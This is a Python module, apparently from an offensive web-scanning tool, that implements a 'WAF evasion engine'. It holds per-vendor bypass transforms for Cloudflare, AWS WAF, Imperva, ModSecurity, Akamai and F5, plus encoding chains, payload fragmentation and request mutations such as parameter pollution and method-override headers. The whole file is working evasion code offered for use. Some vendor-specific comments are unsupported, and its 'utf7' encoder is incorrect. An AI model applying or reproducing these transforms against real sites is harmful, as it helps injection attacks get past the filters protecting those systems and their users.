"""
Advanced WAF Evasion Engine v2 — Phase 32.

Four specialised sub-engines:
  1. WAF Fingerprint-Specific Bypass
  2. Encoding Chain Engine
  3. Payload Fragmentation Engine
  4. Request Mutation Engine
"""
import logging
import random
import re
import urllib.parse

logger = logging.getLogger(__name__)

# ═════════════════════════════════════════════════════════════════════════════
# 1.  WAF-Specific Bypass Payloads
# ═════════════════════════════════════════════════════════════════════════════

# Each entry: list of transform functions  (payload → payload)
# Ordered from most generic to most specific

_CLOUDFLARE_BYPASSES = [
    # Cloudflare normalises Unicode late — fullwidth works
    lambda p: ''.join(
        chr(ord(c) - ord('a') + 0xFF41) if 'a' <= c <= 'z'
        else chr(ord(c) - ord('A') + 0xFF21) if 'A' <= c <= 'Z'
        else c for c in p
    ),
    # Double-URL-encode
    lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    # Newline splitting
    lambda p: p.replace(' ', '\n'),
    # Cloudflare misses payloads inside chunk-encoded bodies
    lambda p: f'0\r\n\r\n{p}',
]

_AWS_WAF_BYPASSES = [
    # AWS WAF has trouble with overlong UTF-8
    lambda p: p.replace('<', '%C0%BC').replace('>', '%C0%BE'),
    # Double-URL-encode
    lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    # JSON Unicode escapes
    lambda p: ''.join(f'\\u{ord(c):04x}' if c.isalpha() else c for c in p),
    # Case randomisation
    lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
]

_IMPERVA_BYPASSES = [
    # Comment insertion (SQL-style)
    lambda p: re.sub(r'(\w{3,})', lambda m: m.group()[:len(m.group())//2] + '/**/' + m.group()[len(m.group())//2:], p),
    # Tab replacement
    lambda p: p.replace(' ', '\t'),
    # HTML entity encoding
    lambda p: ''.join(f'&#{ord(c)};' if c.isalpha() else c for c in p),
]

_MODSECURITY_BYPASSES = [
    # Comment-insertion works well against CRS rules
    lambda p: re.sub(r'(\w{3,})', lambda m: m.group()[:len(m.group())//2] + '/**/' + m.group()[len(m.group())//2:], p),
    # Whitespace variation (%09 tab)
    lambda p: p.replace(' ', '%09'),
    # Null-byte prefix
    lambda p: '%00' + p,
    # Case randomisation
    lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() if c.isalpha() else c for c in p),
]

_AKAMAI_BYPASSES = [
    # Double-URL-encode
    lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    # Unicode fullwidth
    lambda p: ''.join(
        chr(ord(c) - ord('a') + 0xFF41) if 'a' <= c <= 'z'
        else chr(ord(c) - ord('A') + 0xFF21) if 'A' <= c <= 'Z'
        else c for c in p
    ),
    # Chunk-encoding trick
    lambda p: f'0\r\n\r\n{p}',
]

_F5_BYPASSES = [
    # Whitespace variation (vertical tab)
    lambda p: p.replace(' ', '\x0b'),
    # Comment insertion
    lambda p: re.sub(r'(\w{3,})', lambda m: m.group()[:len(m.group())//2] + '/**/' + m.group()[len(m.group())//2:], p),
    # Unicode substitution
    lambda p: ''.join(
        chr(ord(c) - ord('a') + 0xFF41) if 'a' <= c <= 'z'
        else c for c in p
    ),
]

WAF_BYPASS_MAP = {
    'cloudflare': _CLOUDFLARE_BYPASSES,
    'aws_waf': _AWS_WAF_BYPASSES,
    'aws': _AWS_WAF_BYPASSES,
    'imperva': _IMPERVA_BYPASSES,
    'incapsula': _IMPERVA_BYPASSES,
    'modsecurity': _MODSECURITY_BYPASSES,
    'crs': _MODSECURITY_BYPASSES,
    'akamai': _AKAMAI_BYPASSES,
    'f5': _F5_BYPASSES,
    'big-ip': _F5_BYPASSES,
    'bigip': _F5_BYPASSES,
}


class WAFFingerprintBypass:
    """Select bypass techniques based on the identified WAF product."""

    def __init__(self, waf_products: list = None):
        self.waf_products = [p.lower() for p in (waf_products or [])]

    def generate(self, payload: str, max_variants: int = 4) -> list:
        """Return evasion variants tailored to the detected WAF(s)."""
        transforms = self._get_transforms()
        if not transforms:
            return []

        variants = []
        seen = {payload}
        for fn in transforms:
            if len(variants) >= max_variants:
                break
            try:
                v = fn(payload)
                if v and v not in seen:
                    variants.append(v)
                    seen.add(v)
            except Exception:
                continue
        return variants

    def _get_transforms(self) -> list:
        transforms = []
        for product in self.waf_products:
            for key, fns in WAF_BYPASS_MAP.items():
                if key in product:
                    transforms.extend(fns)
                    break
        # Deduplicate by id
        seen_ids = set()
        unique = []
        for fn in transforms:
            if id(fn) not in seen_ids:
                unique.append(fn)
                seen_ids.add(id(fn))
        return unique


# ═════════════════════════════════════════════════════════════════════════════
# 2.  Encoding Chain Engine
# ═════════════════════════════════════════════════════════════════════════════

ENCODING_CHAINS = {
    'double_url': lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    'html_entity_url': lambda p: urllib.parse.quote(
        ''.join(f'&#{ord(c)};' if c.isalpha() else c for c in p), safe=''),
    'unicode_normalise': lambda p: ''.join(
        chr(ord(c) - ord('a') + 0xFF41) if 'a' <= c <= 'z'
        else chr(ord(c) - ord('A') + 0xFF21) if 'A' <= c <= 'Z'
        else c for c in p
    ),
    'utf7': lambda p: '+' + ''.join(f'{ord(c):04X}' for c in p) + '-' if p else p,
    'overlong_utf8': lambda p: p.replace('<', '%C0%BC').replace('>', '%C0%BE').replace("'", '%C0%A7').replace('"', '%C0%A2'),
    'multipart_boundary': lambda p: f'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="x"\r\n\r\n{p}\r\n------WebKitFormBoundary--',
}


class EncodingChainEngine:
    """Apply layered encoding transforms to payloads."""

    def __init__(self, chains: list = None):
        self.chains = chains or list(ENCODING_CHAINS.keys())

    def generate(self, payload: str, max_variants: int = 4) -> list:
        """Return encoded variants of *payload*."""
        variants = []
        seen = {payload}
        for chain_name in self.chains:
            if len(variants) >= max_variants:
                break
            fn = ENCODING_CHAINS.get(chain_name)
            if not fn:
                continue
            try:
                v = fn(payload)
                if v and v not in seen:
                    variants.append(v)
                    seen.add(v)
            except Exception:
                continue
        return variants


# ═════════════════════════════════════════════════════════════════════════════
# 3.  Payload Fragmentation Engine
# ═════════════════════════════════════════════════════════════════════════════

FRAGMENTATION_TECHNIQUES = {
    'chunked_transfer': lambda p: _chunked_body(p),
    'sql_comment': lambda p: re.sub(r' ', '/**/', p),
    'html_comment': lambda p: re.sub(r'(<\w+)', r'<!-->\1', p),
    'null_byte': lambda p: '%00'.join(p[i:i+3] for i in range(0, len(p), 3)),
    'newline_split': lambda p: '\r\n'.join(p[i:i+4] for i in range(0, len(p), 4)),
    'sql_concat': lambda p: _sql_concat(p),
    'js_concat': lambda p: _js_concat(p),
}


def _chunked_body(payload: str) -> str:
    """Simulate chunked transfer encoding body."""
    chunk_size = max(3, len(payload) // 3)
    parts = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    result = ''
    for part in parts:
        result += f'{len(part):x}\r\n{part}\r\n'
    result += '0\r\n\r\n'
    return result


def _sql_concat(payload: str) -> str:
    """Fragment using SQL string concatenation."""
    if len(payload) < 4:
        return payload
    mid = len(payload) // 2
    return f"CONCAT('{payload[:mid]}','{payload[mid:]}')"


def _js_concat(payload: str) -> str:
    """Fragment using JS string concatenation."""
    if len(payload) < 4:
        return payload
    mid = len(payload) // 2
    return f"'{payload[:mid]}'+" + f"'{payload[mid:]}'"


class PayloadFragmentationEngine:
    """Break payloads into fragments to evade pattern matching."""

    def __init__(self, techniques: list = None):
        self.techniques = techniques or list(FRAGMENTATION_TECHNIQUES.keys())

    def generate(self, payload: str, max_variants: int = 4) -> list:
        """Return fragmented variants of *payload*."""
        variants = []
        seen = {payload}
        for tech_name in self.techniques:
            if len(variants) >= max_variants:
                break
            fn = FRAGMENTATION_TECHNIQUES.get(tech_name)
            if not fn:
                continue
            try:
                v = fn(payload)
                if v and v not in seen:
                    variants.append(v)
                    seen.add(v)
            except Exception:
                continue
        return variants


# ═════════════════════════════════════════════════════════════════════════════
# 4.  Request Mutation Engine
# ═════════════════════════════════════════════════════════════════════════════

CONTENT_TYPES = [
    'application/x-www-form-urlencoded',
    'application/json',
    'multipart/form-data; boundary=----SafeWebBoundary',
    'text/plain',
    'text/xml',
    'application/xml',
]

HTTP_METHODS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']

METHOD_OVERRIDE_HEADERS = [
    'X-HTTP-Method-Override',
    'X-Method-Override',
    'X-HTTP-Method',
]


class RequestMutationEngine:
    """
    Generate mutated HTTP request parameters to bypass WAF inspection.

    Mutations:
      - Content-Type confusion
      - HTTP Parameter Pollution (HPP)
      - HTTP method override
      - Case variation on methods/headers
    """

    def content_type_variants(self) -> list:
        """Return Content-Type values that may confuse WAF body parsing."""
        return CONTENT_TYPES[:]

    def hpp_variants(self, param_name: str, payload: str) -> list:
        """HTTP Parameter Pollution — duplicate param with different values."""
        return [
            f'{param_name}=safe&{param_name}={urllib.parse.quote(payload, safe="")}',
            f'{param_name}={urllib.parse.quote(payload, safe="")}&{param_name}=safe',
            f'{param_name}[]=safe&{param_name}[]={urllib.parse.quote(payload, safe="")}',
        ]

    def method_override_headers(self, target_method: str) -> list:
        """Return header dicts that override the real HTTP method."""
        return [
            {hdr: target_method}
            for hdr in METHOD_OVERRIDE_HEADERS
        ]

    def case_variants(self, method: str) -> list:
        """Return case-varied HTTP methods."""
        return list({
            method.upper(),
            method.lower(),
            method.capitalize(),
            method[0].lower() + method[1:].upper(),
        })

    def version_downgrade_headers(self) -> dict:
        """Headers that suggest HTTP/1.0 behaviour."""
        return {
            'Connection': 'close',
            'Pragma': 'no-cache',
        }


# ═════════════════════════════════════════════════════════════════════════════
# Unified Interface
# ═════════════════════════════════════════════════════════════════════════════

class AdvancedWAFEvasion:
    """
    Unified Phase 32 WAF evasion — combines all four sub-engines.

    Usage:
        engine = AdvancedWAFEvasion(waf_products=['cloudflare'])
        all_variants = engine.generate_all(payload, max_per_engine=3)
    """

    def __init__(self, waf_products: list = None):
        self.fingerprint = WAFFingerprintBypass(waf_products)
        self.encoding = EncodingChainEngine()
        self.fragmentation = PayloadFragmentationEngine()
        self.mutation = RequestMutationEngine()

    def generate_all(self, payload: str, max_per_engine: int = 3) -> list:
        """Return unique evasion variants from all engines."""
        variants = []
        seen = {payload}

        for batch in (
            self.fingerprint.generate(payload, max_per_engine),
            self.encoding.generate(payload, max_per_engine),
            self.fragmentation.generate(payload, max_per_engine),
        ):
            for v in batch:
                if v not in seen:
                    variants.append(v)
                    seen.add(v)
        return variants

    def get_request_mutations(self, param_name: str, payload: str) -> dict:
        """Return request-level mutations (headers, HPP, method overrides)."""
        return {
            'content_types': self.mutation.content_type_variants(),
            'hpp': self.mutation.hpp_variants(param_name, payload),
            'method_overrides': self.mutation.method_override_headers('POST'),
            'downgrade_headers': self.mutation.version_downgrade_headers(),
        }
